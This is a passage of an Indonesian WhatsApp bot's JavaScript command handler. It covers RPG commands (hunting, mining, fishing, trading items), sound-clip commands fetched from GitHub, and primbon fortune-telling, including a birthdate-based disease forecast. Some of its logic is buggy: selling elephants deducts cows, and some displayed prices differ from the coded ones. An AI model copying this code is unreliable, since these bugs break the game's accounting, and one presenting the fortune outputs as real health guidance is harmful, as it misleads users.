break
//━━━━━━━━━━━━━━━[ RPG ]━━━━━━━━━━━━━━━━━//	  	  	  
case 'leaderboard':
{      
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _buruan){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟Ikan* : ${i.ikan}\n`
txt += `*🐔Ayam* : ${i.ayam}\n`
txt += `*🐇Kelinci* : ${i.kelinci}\n`
txt += `*🐑Domba* : ${i.domba}\n`
txt += `*🐄Sapi* : ${i.sapi}\n`
txt += `*🐘Gajah* : ${i.gajah}\n\n`
}
setReply(txt)       
}
break
case 'mining': case 'menambang':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isInventory){ addInventori(sender) }
if (isCekDarah < 1) return setReply('Kamu kelelahan!, cobalah heal menggunakan potion') 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]  
var emasnya = emas[Math.floor(Math.random() * emas.length)]  
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]  
setTimeout( () => {
let caption = `[ HASIL MENAMBANG ]\n*Besi* : ${besinya}\n*Emas* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
{
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Menambang lagi⛏️'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: './ACTION/PLICE/FOTO/RPG/tambang.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4
}
xdev.sendMessage(from, buttonMessage, { quoted: setQuoted })  
}, 7000)  
setTimeout( () => {
setReply(`@${sender.split("@")[0]} Mulai menambang🎣`)     
}, 1500)
kurangDarah(sender, 10)
addBesi(sender, besinya)
addEmas(sender, emasnya)
addEmerald(sender, emeraldnya)	     
}   
break  
case 'beli': case 'buy':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isInventoriBuruan){ addInventoriBuruan(sender) } 
if (!isInventoryMonay){ addInventoriMonay(sender) }
if (!isInventory){ addInventori(sender) }
if (!q) return setReply('Mau beli apa?\n*Berikut listnya*\n> potion\n> umpan\n> limit')
var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} potion 2\n 1 potion = 100000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(sender, noh)
var apalu = anu * 1
addPotion(sender, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(sender)}\n*Potion kamu* : ${getPotion(sender)}`)
}, 2000) 
} else 
if (args[0] === 'umpan'){
let noh = 5000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} umpan 2\n 1 umpan = 2500 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(sender, noh)
var apalu = anu * 1
addUmpan(sender, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(sender)}\n*Umpan kamu* : ${getUmpan(sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
if (!args[1]) return setReply(`Example : ${prefix + command} limit 2\n 1 limit = 35000 monay`)
if (isMonay < noh) return setReply('Sisa monay kamu tidak mencukupi untuk pembelian ini')
kurangMonay(sender, noh)
var apalu = anu * 1
addInventoriLimit(sender, apalu)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Sisa monay kamu* : ${getMonay(sender)}\n*Limit kamu* : ${getLimit(sender)}`)
}, 2000) 
} else { setReply("Format salah!") }
}
break
case 'sel': case 'jual':{//BY LORD RIFZA
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply(`Mau jual apa?\n*Kamu bisa yang ada di list berikut*\n> ikan\n> ayam\n> kelinci\n> domba\n> sapi\n> gajah\n> besi\n> emas\n> emerald`)
if (!isInventoriBuruan){ addInventoriBuruan(sender) } 
if (!isInventoryMonay){ addInventoriMonay(sender) }
if (!isInventory){ addInventori(sender) }
var anu = args[1]
if (args[0] === 'ikan'){
if (isIkan < anu) return setReply('Ikan kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ikan 2\n 1 ikan = 1500 monay`)
kurangIkan(sender, anu)
let monaynya = 1500 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Ikan kamu* : ${getIkan(sender)}`)
}, 2000) 
} else
if (args[0] === 'ayam'){
if (isAyam < anu) return setReply('Ayam kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} ayam 2\n 1 ayam = 2500 monay`)
kurangAyam(sender, anu)
let monaynya = 2500 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Ayam kamu* : ${getAyam(sender)}`)
}, 2000) 
} else
if (args[0] === 'kelinci'){
if (isKelinci < anu) return setReply('Kelinci kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} kelinci 2\n 1 kelinci = 3000 monay`)
kurangKelinci(sender, anu)
let monaynya = 3000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Kelinci kamu* : ${getKelinci(sender)}`)
}, 2000) 
} else
if (args[0] === 'domba'){
if (isDomba < anu) return setReply('Domba kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} domba 2\n 1 domba = 5000 monay`)
kurangDomba(sender, anu)
let monaynya = 5000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Domba kamu* : ${getDomba(sender)}`)
}, 2000) 
} else
if (args[0] === 'sapi'){
if (isSapi < anu) return setReply('Sapi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} sapi 2\n 1 sapi = 10000 monay`)
kurangSapi(sender, anu)
let monaynya = 10000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Sapi kamu* : ${getSapi(sender)}`)
}, 2000) 
} else
if (args[0] === 'gajah'){
if (isGajah < anu) return setReply('Gajah kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} gajah 2\n 1 gajah = 15000 monay`)
kurangSapi(sender, anu)
let monaynya = 15000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Gajah kamu* : ${getGajah(sender)}`)
}, 2000) 
} else
if (args[0] === 'besi'){
if (isBesi < anu) return setReply('Besi kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} besi 2\n 1 besi = 15000 monay`)
kurangBesi(sender, anu)
let monaynya = 16000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa Besi kamu* : ${getBesi(sender)}`)
}, 2000) 
} else
if (args[0] === 'emas'){
if (isEmas < anu) return setReply('Emas kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emas 2\n 1 emas = 50000 monay`)
kurangEmas(sender, anu)
let monaynya = 50000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa emas kamu* : ${getEmas(sender)}`)
}, 2000) 
} else
if (args[0] === 'emerald'){
if (isEmerald < anu) return setReply('Emerald kamu tidak mencukupi untuk transaksi ini')
if (!args[1]) return setReply(`Example : ${prefix + command} emerald 2\n 1 emerald = 100000 monay`)
kurangEmerald(sender, anu)
let monaynya = 100000 * anu
addMonay(sender, monaynya)
setTimeout( () => {
setReply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(sender)}\n*Sisa emerald kamu* : ${getEmerald(sender)}`)
}, 2000) 
} else { setReply("Format salah!") }
}
break
case 'heal':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isCekDarah < 1) return setReply('Kamu hanya bisa heal ketika darah kamu 0')
if (isCekDarah > 100) return setReply('Darah kamu sudah penuh')
if (isPotion < 1) return setReply('Kamu tidak punya potion, cobalah beli dengan cara #buypotion _jumlah_') 
addDarah(sender, 100)
kurangPotion(sender, 1)
setReply('Berhasil, darah kamu sudah full')
}
break
case 'berburu':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDarah){ addInventoriDarah(sender, DarahAwal) }
if (isCekDarah < 1) return setReply('Darah kamu habis, cobalah heal menggunakan potion') 
if (!isInventoriBuruan){ addInventoriBuruan(sender) } 
let luka = ["Tertusuk duri saat berburu","Terpeleset ke jurang saat berburu","Tercakar hewan buas","Tidak berhati-hati","Terjerat akar","Terjatuh saat berburu"]
let location = ["Hutan rimba","Hutan Amazon","Hutan tropis","Padang rumput","Hutan afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]    
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Hutan rimba') {
var image = './ACTION/PLICE/FOTO/RPG/rimba.jpg'
} else
if (lokasinya === 'Hutan Amazon') {
var image =  './ACTION/PLICE/FOTO/RPG/amazon.jpg'
} else
if (lokasinya === 'Hutan tropis') {
var image = './ACTION/PLICE/FOTO/RPG/tropis.jpg'
} else
if (lokasinya === 'Padang rumput') {
var image = './ACTION/PLICE/FOTO/RPG/padang_rumput.jpg'
} else
if (lokasinya === 'Hutan afrika') {
var image = './ACTION/PLICE/FOTO/RPG/afrika.jpg'
} else
if (lokasinya === 'Pegunungan') {
var image = './ACTION/PLICE/FOTO/RPG/pegunungan.jpg'
}
setTimeout( () => {
let teksehmazeh = `_[ HASIL BURUAN ]_\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Terluka* : ${lukanya}, darah - 10\n`
teksehmazeh += `*Sisa darah* : ${getDarah(sender)}\n`
let buttons = [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: 'Berburu lagi️🏹'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: image },
caption: teksehmazeh,
footer: fake,
buttons: buttons,
headerType: 4
}
xdev.sendMessage(from, buttonMessage, { quoted: setQuoted })      
}, 5000)  
setTimeout( () => {
setReply(`@${sender.split("@")[0]} Mulai berburu di ${lokasinya}`)     
}, 1000) 
addIkan(sender, ikanmu) 
addAyam(sender, ayam) 
addKelinci(sender, kelinci)
addDomba(sender, domba)
addSapi(sender, sapi)
addGajah(sender, gajah)
kurangDarah(sender, 10)
}
break
case 'inventori':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDarah){ addInventoriDarah(sender, DarahAwal) }
if (!isInventory){ addInventori(sender) }
if (!isInventoriBuruan){ addInventoriBuruan(sender) }  
let teksehmazeh = `_[ 👩🏻‍💼INFO USER👨🏻‍💼 ]_\n\n`
teksehmazeh += `*❤️Darah kamu* : ${getDarah(sender)}\n`
teksehmazeh += `*◻️️Besi kamu* : ${getBesi(sender)}\n`
teksehmazeh += `*🌟Emas Kamu* : ${getEmas(sender)}\n`
teksehmazeh += `*💎Emerald Kamu* : ${getEmerald(sender)}\n`
teksehmazeh += `*⏺️Limit kamu* : ${getLimit(sender)}\n`
teksehmazeh += `*🧪Potion Kamu* : ${getPotion(sender)}\n\n`
teksehmazeh += `_[ 🐺HASIL BURUAN🐺 ]_\n`
teksehmazeh += `*🐟Ikan* : ${getIkan(sender)}\n`
teksehmazeh += `*🐔Ayam* : ${getAyam(sender)}\n`
teksehmazeh += `*🐇Kelinci* : ${getKelinci(sender)}\n`
teksehmazeh += `*🐑Domba* : ${getDomba(sender)}\n`
teksehmazeh += `*🐄Sapi* : ${getSapi(sender)}\n`
teksehmazeh += `*🐘Gajah* : ${getGajah(sender)}\n\n`
teksehmazeh += `_*${botName}*_`  
setReply(teksehmazeh)
}
break
case 'mancing':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isInventoriBuruan){ addInventoriBuruan(sender) } 
if (isUmpan < 1) return setReply('Umpan kamu habis!, cobalah berburu dan ubah dagingnya menjadi umpan')
setReply("1 umpan terpakai")
var ikannya = ikan[Math.floor(Math.random() * ikan.length)]
var ditangkap = Math.ceil(Math.random() * 20)
setTimeout( () => {
let caption = `Hasil tangkapan : ${ikannya}\n> Jumlah tangkapan : ${ditangkap}`
let buttons = [
{
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Mancing lagi🎣'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: './ACTION/PLICE/FOTO/RPG/mancing.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4
}
xdev.sendMessage(from, buttonMessage, { quoted: setQuoted })   
}, 7000)  
setTimeout( () => {
setReply(`@${sender.split("@")[0]} Mulai memancing🎣`)     
}, 1500)
kurangUmpan(sender, 1)
addIkan(sender, ditangkap)	     
}   
break  
case 'darah':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isDarah){ addInventoriDarah(sender, DarahAwal) }
let dapat =  getDarah(sender)
setReply(`${dapat}`)
}
break
//━━━━━━━━━━━━━━━[ SOUND ]━━━━━━━━━━━━━━━━━//			
case 'sound1':case 'sound2':case 'sound3':case 'sound4':case 'sound5':
case 'sound6':case 'sound7':case 'sound8':case 'sound9':case 'sound10':
case 'sound11':case 'sound12':case 'sound13':case 'sound14':case 'sound15':
case 'sound16':case 'sound17':case 'sound18':case 'sound19':case 'sound20':
case 'sound21':case 'sound22':case 'sound23':case 'sound24':case 'sound25':
case 'sound26':case 'sound27':case 'sound28':case 'sound29':case 'sound30':
case 'sound31':case 'sound32':case 'sound33':case 'sound34':case 'sound35':
case 'sound36':case 'sound37':case 'sound38':case 'sound39':case 'sound40':
case 'sound41':case 'sound42':case 'sound43':case 'sound44':case 'sound45':
case 'sound46':case 'sound47':case 'sound48':case 'sound49':case 'sound50':
case 'sound51':case 'sound52':case 'sound53':case 'sound54':case 'sound55':
case 'sound56':case 'sound57':case 'sound58':case 'sound59':case 'sound60':
case 'sound61':case 'sound62':case 'sound63':case 'sound64':case 'sound65':
case 'sound66':case 'sound67':case 'sound68':case 'sound69':case 'sound70':
case 'sound71':case 'sound72':case 'sound73':case 'sound74':case 'sound75':
case 'sound76':case 'sound77':case 'sound78':case 'sound79':case 'sound80':
case 'sound81':case 'sound82':case 'sound83':case 'sound84':case 'sound85':
case 'sound86':case 'sound87':case 'sound88':case 'sound89':case 'sound90':
case 'sound91':case 'sound92':case 'sound93':case 'sound94':case 'sound95':
case 'sound96':case 'sound97':case 'sound98':case 'sound99':case 'sound100':
case 'sound101':case 'sound102':case 'sound103':case 'sound104':case 'sound105':
case 'sound106':case 'sound107':case 'sound108':case 'sound109':case 'sound110':
case 'sound111':case 'sound112':case 'sound113':case 'sound114':case 'sound115':
case 'sound116':case 'sound117':case 'sound118':case 'sound119':case 'sound120':
case 'sound121':case 'sound122':case 'sound123':case 'sound124':case 'sound125':
case 'sound126':case 'sound127':case 'sound128':case 'sound129':case 'sound130':
case 'sound131':case 'sound132':case 'sound133':case 'sound134':case 'sound135':
case 'sound136':case 'sound137':case 'sound138':case 'sound139':case 'sound140':
case 'sound141':case 'sound142':case 'sound143':case 'sound144':case 'sound145':
case 'sound146':case 'sound147':case 'sound148':case 'sound149':case 'sound150':
case 'sound151':case 'sound152':case 'sound153':case 'sound154':case 'sound155':
case 'sound156':case 'sound157':case 'sound158':case 'sound159':case 'sound160':
case 'sound161':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let sound = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
xdev.sendMessage(from, { audio: sound, mimetype: 'audio/mp4', ptt: true }, { quoted: setQuoted })
break
//━━━━━━━━━━━━━━━[ PRIBON ]━━━━━━━━━━━━━━━━━//  
case 'nomerhoki': case 'nomorhoki': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 6288292024190`) 
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`}, {quoted: setQuoted}) 
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} belanja`) 
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`}, {quoted: setQuoted}) 
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (!isDevoloper) return onlyPrem()
if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'suamiistri': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'ramalancinta': case 'ramalcinta': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'artinama': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika Ardianta`) 
let anu = await primbon.arti_nama(text)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'kecocokannama': case 'cocoknama': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`}, {quoted: setQuoted}) 
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika|Novia`) 
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { image: { url: anu.message.gambar }, caption: `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}` }, { quoted: setQuoted })
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 6, 12, 2020`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`}, {quoted: setQuoted}) 
}
break
case 'sifatusaha': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix+ command} 28, 12, 2021`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`}, {quoted: setQuoted}) 
}
break
case 'rejeki': case 'rezeki': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'pekerjaan': case 'kerja': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`}, {quoted: setQuoted}) 
}
break
case 'potensipenyakit': case 'penyakit': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'artitarot': case 'tarot': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { image: { url: anu.message.gambar }, caption: `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}` }, { quoted: setQuoted })
}
break
case 'fengshui': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`) 
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`}, {quoted: setQuoted}) 
}
break
case 'haribaik': {
if (!isDevoloper) return onlyPrem()
if (!q) return setReply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return setReply(anu.message)
xdev.sendMessage(from, { text:`⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`}, {quoted: setQuoted}) 
}
break
case 'harisangar': case 'taliwangke': {
if (!isDevoloper) return onlyPrem()
